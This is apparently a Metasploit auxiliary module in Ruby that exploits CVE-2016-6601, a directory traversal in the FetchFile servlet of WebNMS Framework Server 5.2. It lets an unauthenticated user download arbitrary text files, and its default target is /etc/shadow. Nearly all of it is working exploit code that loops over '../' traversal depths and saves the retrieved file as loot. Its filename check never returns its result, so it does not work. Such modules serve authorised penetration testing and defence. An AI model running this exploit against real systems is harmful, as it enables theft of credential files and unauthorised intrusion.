##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'WebNMS Framework Server Arbitrary Text File Download',
        'Description' => %q(
This module abuses a vulnerability in WebNMS Framework Server 5.2 that allows an
unauthenticated user to download files off the file system by using a directory
traversal attack on the FetchFile servlet.
Note that only text files can be downloaded properly, as any binary file will get
mangled by the servlet. Also note that for Windows targets you can only download
files that are in the same drive as the WebNMS installation.
This module has been tested with WebNMS Framework Server 5.2 and 5.2 SP1 on
Windows and Linux.
),
        'Author' =>
          [
            'Pedro Ribeiro <pedrib[at]gmail.com>' # Vulnerability discovery and MSF module
          ],
        'License' => MSF_LICENSE,
        'References' =>
          [
            [ 'CVE', '2016-6601'],
            [ 'URL', 'https://blogs.securiteam.com/index.php/archives/2712' ],
            [ 'URL', 'https://seclists.org/fulldisclosure/2016/Aug/54' ]
          ],
        'DisclosureDate' => 'Jul 4 2016'
      )
    )
    register_options(
      [
        OptPort.new('RPORT', [true, 'The target port', 9090]),
        OptString.new('TARGETURI', [ true, "WebNMS path", '/']),
        OptString.new('FILEPATH', [ false, "The filepath of the file you want to download", '/etc/shadow']),
        OptString.new('TRAVERSAL_PATH', [ false, "The traversal path to the target file (if you know it)"]),
        OptInt.new('MAX_TRAVERSAL', [ false, "Maximum traversal path depth (if you don't know the traversal path)", 10])
      ],
      self.class
    )
  end

  def check_filename(path)
    valid = true
    invalid_chars = [':', '?', '*', '|', '"', '<', '>']
    invalid_chars.each do |i|
      if path.include? i
        valid = false
        break
      end
    end
  end

  def run
    if check_filename(datastore['filepath'])
      file = nil
      if datastore['TRAVERSAL_PATH'].nil?
        traversal_size = datastore['MAX_TRAVERSAL']
        file = get_file(datastore['FILEPATH'], traversal_size)
      else
        file = get_file(datastore['TRAVERSAL_PATH'], 1)
      end
      if file.nil?
        print_error("#{peer} - Failed to download the specified file.")
        return
      else
        vprint_line(file)
        fname = File.basename(datastore['FILEPATH'])

        path = store_loot(
          'webnms.http',
          'text/plain',
          datastore['RHOST'],
          file,
          fname
        )
        print_good("File download successful, file saved in #{path}")
      end
    else
      print_error("Module Failed: Invalid Filename")
    end
  end

  def get_file(path, depth)
    while depth > 0
      file_name = "../" * depth + path
      vprint_status("Attempting to get file: #{file_name}")
      begin
        res = send_request_cgi(
          {
            'uri'      => normalize_uri(target_uri.path, 'servlets', 'FetchFile'),
            'method'   => 'GET',
            'vars_get' => { 'fileName' => file_name }
          }
        )
      rescue Rex::ConnectionRefused, Rex::ConnectionTimeout,
             Rex::HostUnreachable, Errno::ECONNRESET => e
        print_error("Connect to the target: #{e.class} - #{e.message}")
        return nil
      end
      if res &&
         res.code == 200 &&
         !res.body.to_s.empty? &&
         (res.body.to_s.include? "File Found")
        return res.body.to_s
      end
      depth -= 1
    end
  end
end
